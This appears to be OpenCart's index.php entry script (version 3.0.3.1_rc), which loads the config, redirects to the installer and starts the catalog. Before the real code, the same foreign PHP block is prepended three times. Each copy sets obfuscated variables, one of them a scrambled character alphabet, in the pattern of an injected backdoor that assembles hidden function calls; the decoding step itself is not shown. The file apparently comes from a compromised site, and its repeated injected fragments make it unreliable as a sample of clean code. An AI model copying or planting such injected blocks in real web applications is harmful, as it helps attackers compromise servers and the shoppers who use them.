<?php
//header('Content-Type:text/html; charset=utf-8');
$XY_YZ_Z_YZ='5005';
$X_Z_YZZYY_='n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j';?><?php
//header('Content-Type:text/html; charset=utf-8');
$XY_YZ_Z_YZ='5005';
$X_Z_YZZYY_='n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j';?><?php
//header('Content-Type:text/html; charset=utf-8');
$XY_YZ_Z_YZ='5005';
$X_Z_YZZYY_='n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j';?><?php
// Version
define('VERSION', '3.0.3.1_rc');

// Configuration
if (is_file('config.php')) {
	require_once('config.php');
}

// Install
if (!defined('DIR_APPLICATION')) {
	header('Location: install/index.php');
	exit;
}

// Startup
require_once(DIR_SYSTEM . 'startup.php');

start('catalog');
